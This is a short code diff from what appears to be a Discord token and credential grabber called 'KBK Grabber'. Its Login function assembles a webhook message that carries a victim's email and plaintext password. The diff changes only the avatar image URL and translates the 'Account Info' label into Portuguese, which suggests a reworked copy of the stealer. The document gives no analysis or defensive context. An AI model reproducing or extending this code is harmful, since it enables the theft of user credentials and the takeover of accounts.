@@ -129,13 +129,13 @@ function Login(email, password, token) {
             var params = {
                 username: "KBK Grabber",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+                avatar_url: "https://cdn.discordapp.com/attachments/917536367880335410/917536378395443290/ohdear_avatar.png",
                 embeds: [
                     {
                         "color": 16711680,
                         "fields": [
                             {
-                                "name": "**Account Info**",
+                                "name": "**Informações da Conta**",
                                 "value": `Email: ${email} - Password: ${password}`,
                                 "inline": true
                             },
